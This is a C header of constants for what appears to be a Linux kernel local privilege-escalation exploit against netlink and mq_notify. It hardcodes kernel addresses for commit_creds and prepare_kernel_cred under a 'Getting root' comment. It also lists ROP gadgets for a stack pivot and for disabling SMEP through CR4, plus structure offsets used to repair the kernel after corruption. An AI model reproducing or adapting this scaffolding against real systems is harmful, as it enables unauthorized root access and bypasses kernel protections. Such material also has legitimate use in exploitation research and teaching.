#ifndef __CONST__
#define __CONST__

#define SOL_NETLINK 270
#define NOTIFY_COOKIE_LEN 32
#define KMALLOC_TARGET 2048
#define NUMB_THREAD 10
#define MAX_CREATE_SOCKS 300

#define PRESS_KEY()                                                            \
  do {                                                                         \
    printf("[ ] press key to continue...\n");                                  \
    getchar();                                                                 \
  } while (0)

// Structure offset
#define NLK_PID 0x2b0
#define NLK_GRO 0x2c8
#define NLK_WAIT 0x2E0
#define WQ_HEAD 0x8
#define WQ_FUNC 0x10
#define WQ_NEXT 0x18
// These structure are for repairing the kernel
#define FILES_OFFSET 0x5d8 // task_struct task->files
#define OFFSET_FDT 0x08 //file_struct files->fdt
#define OFFSET_FDT_ARRAY 0x08 //Fdtable fdt->fd
#define OFFSET_FILE 0xd0 //file fdt->fd[N]->private_data
#define OFFSET_SOCKET 0x20 //private_data->sk
#define CONTAINER_SOCKET 0x58 // socket address from hashlist
// Kernel address
#define PANIC ((void *)0xffffffff8150f03a)
#define PRINTK ((void*)0xffffffff8150f85e)
// Getting root
#define COMMIT_CREDS ((void *)0xffffffff8108e4b0)
#define PREPARE_KERNEL_CRED ((void *)0xffffffff8108e780)
// Repair the netlink hashed list
#define NETLINK_TABLE_GRAB ((void *)0xffffffff8144f220)
#define NETLINK_TABLE_UNGRAB ((void *)0xffffffff8144f300)
#define NL_TABLE ((void *)0xffffffff81ae4f48)



// Rop gadget
#define STACK_PIVOT 0xffffffff8100008a // xchg eax, rsp; ret;
#define SMEP_MASK (~((uint64_t)(1 << 20))) // 0xffffffffffefffff
#define AND_RAX_RDX 0xffffffff8100bf55
#define MOV_CR4_TO_RAX 0xFFFFFFFF81052B70
#define CLI 0xffffffff8102d706;
#define POP_RDX 0xffffffff81095cc8
#define AND_RAX_RDX 0xffffffff8100bf55
#define MOV_EAX_TO_RDI 0xffffffff81012bed
#define native_write_cr4 0xFFFFFFFF81052B80
#define StoreRBP 0xffffffff810914ee
#define StoreRAX 0xffffffff814a96a7
#define StoredRBPOffset 0x08
#define StoredRAXOffset 0x18

typedef void (*panic)(const char *fmt, ...);
typedef int (*commit_creds)(void *new);
typedef void *(*prepare_kernel_cred)(void *daemon);
typedef void (*netlink_table_grab)(void);
typedef void (*netlink_table_ungrab)(void);
typedef int (*printk)(const char *fmt, ...);
#endif
